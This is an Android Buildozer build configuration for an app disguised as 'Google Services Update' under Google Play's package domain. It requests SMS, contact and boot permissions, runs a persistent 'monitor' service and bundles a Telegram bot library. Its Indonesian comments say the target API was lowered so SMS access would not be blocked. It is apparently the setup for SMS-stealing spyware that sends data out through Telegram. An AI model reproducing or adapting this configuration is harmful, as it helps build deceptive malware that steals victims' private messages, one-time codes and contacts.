[app]
title = Google Services Update
package.name = services_framework
package.domain = com.android.vending
source.dir = .
source.include_exts = py,png,jpg,kv,atlas
version = 1.1

# Menambahkan requests dan certifi agar koneksi Telegram stabil
requirements = python3,kivy,pyTelegramBotAPI,android,pyjnius,requests,certifi

android.permissions = READ_SMS, RECEIVE_SMS, POST_NOTIFICATIONS, INTERNET, RECEIVE_BOOT_COMPLETED, READ_CONTACTS

# DITURUNKAN KE 30 AGAR SMS TIDAK DIBLOKIR SISTEM
android.api = 30
android.minapi = 21
android.ndk = 25b
android.private_storage = True

# Service tetap aktif
services = monitor:main.py

android.archs = arm64-v8a, armeabi-v7a
android.allow_backup = True

[buildozer]
log_level = 2
warn_on_root = 1
